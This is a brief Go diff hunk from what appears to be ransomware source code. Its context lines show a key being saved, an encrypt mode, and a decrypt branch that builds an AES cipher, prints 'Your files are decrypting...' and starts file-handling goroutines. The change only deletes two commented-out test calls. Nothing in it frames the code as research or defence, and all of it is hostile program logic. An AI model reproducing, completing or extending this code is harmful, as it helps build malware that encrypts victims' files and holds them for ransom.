@@ -142,12 +142,10 @@ func main() {
 		saveKey(b)
 		method = 'e'
 		go cAll()
-		//do_cAll("test");close(handleList)
 	} else {
 		cip, _ = aes.NewCipher(bb)
 		fmt.Println("Your files are decrypting...")
 		method = 'd'
-		//do_cAll("test");close(handleList)
 	}
 	go cAll()
 	startHandler(cip)
